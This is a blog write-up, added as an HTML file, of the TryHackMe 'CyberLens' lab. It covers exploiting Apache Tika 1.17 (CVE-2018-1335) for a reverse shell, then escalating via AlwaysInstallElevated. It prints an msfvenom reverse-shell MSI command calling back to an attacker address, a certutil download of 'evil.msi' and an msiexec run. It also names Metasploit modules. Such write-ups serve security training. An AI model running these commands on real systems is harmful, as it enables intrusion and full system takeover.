@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: TryHackMe Link: CyberLens Level: Easy OS: Windows CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to CVE-2018-1335 is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse AlwaysInstallElevated to obtain a system shell.
+Scanning We will use a Bash script to automate the scanning process." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, TryHackMe" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/posts/2024/06/thm-cyberlens/" />
+
+
+    <title>
+        
+            THM: CyberLens
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: CyberLens">
+<meta itemprop="description" content="Platform: TryHackMe Link: CyberLens Level: Easy OS: Windows CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to CVE-2018-1335 is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse AlwaysInstallElevated to obtain a system shell.
+Scanning We will use a Bash script to automate the scanning process."><meta itemprop="datePublished" content="2024-06-19T14:37:09-05:00" />
+<meta itemprop="dateModified" content="2024-06-19T14:37:09-05:00" />
+<meta itemprop="wordCount" content="1009"><meta itemprop="image" content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg" />
+<meta itemprop="keywords" content="TryHackMe," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg" /><meta name="twitter:title" content="THM: CyberLens"/>
+<meta name="twitter:description" content="Platform: TryHackMe Link: CyberLens Level: Easy OS: Windows CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to CVE-2018-1335 is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse AlwaysInstallElevated to obtain a system shell.
+Scanning We will use a Bash script to automate the scanning process."/>
+
+
+
+    <meta property="og:title" content="THM: CyberLens" />
+<meta property="og:description" content="Platform: TryHackMe Link: CyberLens Level: Easy OS: Windows CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to CVE-2018-1335 is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse AlwaysInstallElevated to obtain a system shell.
+Scanning We will use a Bash script to automate the scanning process." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/posts/2024/06/thm-cyberlens/" /><meta property="og:image" content="https://scorpiosec.com/images/THM-CyberLens/CyberLens.svg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-19T14:37:09-05:00" />
+<meta property="article:modified_time" content="2024-06-19T14:37:09-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-06-19 14:37:09 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/06/thm-cyberlens/">fr</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+         | Also available in
+          
+              <a href="https://scorpiosec.com/fr/posts/2024/06/thm-cyberlens/"><span class="flag fi fi-fr"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/posts/2024/06/thm-cyberlens/">THM: CyberLens</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#manual-exploitation">Manual Exploitation</a>
+      <ul>
+        <li><a href="#user-flag">User flag</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#metasploit-method">Metasploit Method</a>
+      <ul>
+        <li><a href="#user-flag-1">User flag</a></li>
+        <li><a href="#privilege-escalation-1">Privilege Escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#closing-words">Closing Words</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://tryhackme.com/r/room/cyberlensp6" target="_blank" >CyberLens</a>
+
+</li>
+<li>Level: Easy</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to <code>CVE-2018-1335</code> is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse <code>AlwaysInstallElevated</code> to obtain a system shell.</p>
+<h2 id="scanning">Scanning</h2>
+<p>We will use a Bash script to automate the scanning process. You can find it <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >here</a>
+
+.</p>
+<p>The script will:</p>
+<ul>
+<li>Scan a target IP for open ports</li>
+<li>Extract them</li>
+<li>Run a detailed scan on the open ports found and save the output in three different formats (.gnmap, .nmap, and .xml)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-19 15:27 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.212.189
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Apache httpd 2.4.57 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: CyberLens: Unveiling the Hidden Matrix
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: CyberLens
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: CyberLens
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2024-06-19T20:27:42+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CyberLens
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-18T19:35:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-12-18T19:35:16
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to the Apache Tika 1.17 Server
+</span></span><span style="display:flex;"><span>|_http-cors: HEAD GET
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>8.y.z-SNAPSHOT<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-06-19T20:27:43
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -20s, deviation: 0s, median: -21s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.15 seconds
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<p>Visiting the target IP address we find a website with an upload feature.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/cyberlens-website.png" alt="CyberLens website"></p>
+<p>After capturing the request we get when we click on <code>Get Metadata</code> we see that the web server is making a request to port <code>61777</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/port-for-request.png" alt="Request to port 61777"></p>
+<p>Checking the port, we get to a web page featuring Apache Tika 1.17.</p>
+<blockquote>
+<p>&ldquo;The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF).&rdquo; Source - <a href="https://github.com/apache/tika" target="_blank" >https://github.com/apache/tika</a>
+
+</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/Apache-Tika.png" alt="Apache Tika Server"></p>
+<p><strong>We are able to solve this room entirely via Metasploit, this writeup will showcase the manual way and the Metasploit method.</strong></p>
+<h2 id="manual-exploitation">Manual Exploitation</h2>
+<h3 id="user-flag">User flag</h3>
+<p>Researching &ldquo;Apache Tika 1.17 rce&rdquo; leads us to <a href="https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/" target="_blank" >this</a>
+
+ Rhino Security Labs article featuring CVE-2018-1335. A PoC is also available <a href="https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py" target="_blank" >here</a>
+
+. To use it  we have to follow this example:</p>
+<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;
+</code></pre><p>Since we are targeting a Windows machine we can make use of PowerShell to get a reverse shell.</p>
+<blockquote>
+<p>On <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
+
+, we use a PowerShell #3 (base64) reverse shell</p>
+</blockquote>
+<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;Target_IP&gt; &lt;PORT_NUMBER&gt; &lt;INSERT REVSHELL HERE&gt;
+</code></pre><p>After running the exploit we get a connection on our listener, we have a shell as the user <code>cyberlens</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/initial-foothold.png" alt="Apache Tika Server"></p>
+<p>We find the user flag on the user&rsquo;s Desktop.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/user-flag.png" alt="user.txt location"></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>For the system enumeration we use <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" >WinPEAS</a>
+
+ and find that <code>AlwaysInstallElevated</code> is enabled.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/AlwaysInstallElevated.png" alt="Winpeas finds AlwaysInstallElevated is enabled"></p>
+<p>The <code>AlwaysInstallElevated</code> setting in Windows is a Group Policy setting that, when enabled, allows Windows Installer to install programs with elevated privileges (i.e., administrative rights) regardless of the user&rsquo;s current privilege level. This setting is controlled through two registry keys:</p>
+<ol>
+<li><strong>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
+<li><strong>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
+</ol>
+<p>If both of these registry keys are set to <code>1</code>, it means that any user, including those with only standard user privileges, can install MSI packages with elevated (administrator) privileges. <em>You can read more about it <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank" >here</a>
+
+.</em></p>
+<p><a href="https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell" target="_blank" >This</a>
+
+ article explains how to abuse <code>AlwaysInstallElevated</code> to obtain a SYSTEM Shell.</p>
+<ol>
+<li>We craft a malicious msi file</li>
+</ol>
+<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
+</code></pre><p><img src="https://scorpiosec.com/images/THM-CyberLens/malicious-msi.png" alt="Malicious msi ile created with msfvenom"></p>
+<ol start="2">
+<li>Send it to the target</li>
+</ol>
+<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
+</code></pre><ol start="3">
+<li>Execute the msi file</li>
+</ol>
+<pre tabindex="0"><code>msiexec /quiet /qn /i evil.msi
+</code></pre><ol start="4">
+<li>We get a connection on our listener as <code>nt authority\system</code></li>
+</ol>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/system-shell.png" alt="System shell"></p>
+<p>We can read the root flag (admin.txt) on the <code>Administrator</code> Desktop.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/root-flag-manual.png" alt="System shell"></p>
+<hr>
+<h2 id="metasploit-method">Metasploit Method</h2>
+<h3 id="user-flag-1">User flag</h3>
+<p>We know which software we are targeting, so we check Metasploit for exploits.</p>
+<p>We do find an exploit for <code>Header Command Injection</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/apache-tika-exploit.png" alt="Metasploit fins exploit for Apache Tika"></p>
+<blockquote>
+<p>Make sure to set all the options correctly. The remote port should be <code>61777</code>.</p>
+</blockquote>
+<p>After running the exploit we get a meterpreter shell.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/meterpreter-shell.png" alt="Meterpreter shell"></p>
+<p>We find the user flag on the user Desktop.</p>
+<h3 id="privilege-escalation-1">Privilege Escalation</h3>
+<p>Now to elevate our privileges we can use the <code>exploit_suggester</code> in Metasploit to find some leads.</p>
+<blockquote>
+<p>You can background the current meterpreter shell with <code>background</code></p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/metasploit-privesc.png" alt="Metasploit exploit suggester for privilege escalation"></p>
+<p>All we have to do is to provide a session number and run the module.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/exploit-suggester.png" alt="Metasploit - Exploit suggester module use"></p>
+<p>It finds five possible exploits for our target.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/exploits-list.png" alt="Exploits list found by exploit suggester in Metasploit"></p>
+<p>We start with the first one.</p>
+<pre tabindex="0"><code>use exploit/windows/local/always_install_elevated
+</code></pre><p>We need to provide a session number, a local host and a local port.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/installed-elevated-exploit.png" alt="AlwaysInstallElevated exploit in Metasploit"></p>
+<p>After running the exploit we get an elevated meterpreter session as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-CyberLens/admin-shell.png" alt="Meterpreter system shell"></p>
+<h2 id="closing-words">Closing Words</h2>
+<p>Metasploit is a powerful framework allowing you to automate a lot of tasks. I am still learning how to optimally use it in order to make my life easier. I found two resources that will be helpful:</p>
+<ul>
+<li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank" >Metasploit Unleashed</a>
+
+ - A free course by Offensive Security teaching you how to thoroughly use the framework.</li>
+<li><a href="https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X" target="_blank" >Metasploit: The Penetration Tester&rsquo;s Guide</a>
+
+ - This book is old but it will deepen your understanding of the framework. If you end up liking it, know that the second edition is coming out in November 2024.</li>
+</ul>
+<p><strong>Note:</strong> OSCP seekers should learn <strong>NOT</strong> to rely too much on Metasploit because you are only allowed to use it once during the exam.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/tags/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1009 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-06-19 14:37
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20CyberLens&amp;caption=THM%3a%20CyberLens&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20CyberLens&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f;description=THM%3a%20CyberLens" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f&amp;title=THM%3a%20CyberLens&amp;summary=THM%3a%20CyberLens&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
